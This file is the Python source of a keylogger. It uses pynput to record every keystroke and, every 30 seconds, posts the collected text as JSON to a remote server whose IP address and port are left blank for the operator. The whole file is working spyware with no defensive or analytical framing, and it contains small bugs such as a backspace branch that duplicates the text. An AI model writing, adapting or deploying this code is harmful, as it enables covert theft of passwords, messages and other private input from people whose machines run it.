
import threading
import json
import requests
from pynput import keyboard

# Server Setup:
ipAdress = ""
portNum = ""

# time in seconds
serverResetTime = 30

# Strings recieved
loggedText = ""

# Errors:
postingError = "Issue Reaching Server or Posting Data"

def sendLoggedText():
    try:
        postVal = json.dumps({"keyboardData" : loggedText})

        req = requests.post(
            f"http://{ipAdress}:{portNum}", 
            data = postVal,
            headers={"Content" : "application/json"})
        
        timedRun = threading.Timer(serverResetTime, sendLoggedText)
        timedRun.start()
        
    except:
        print(postingError)


# Reactions on each press
def onKeyPress(keyVal):
    global loggedText

    if keyVal == keyboard.Key.enter:
        loggedText += "\n"
    elif keyVal == keyboard.Key.space:
        loggedText += " "
    elif keyVal == keyboard.Key.tab:
        loggedText += "\t"
    elif keyVal == keyboard.Key.backspace and len(loggedText) > 0:
        loggedText += loggedText[:-1]
    elif keyVal == keyboard.Key.esc:
        return False
    else:
        loggedText += str(keyVal)

# Main listner for server
with keyboard.Listener(on_press=onKeyPress) as listner:
    sendLoggedText()
    listner.join()

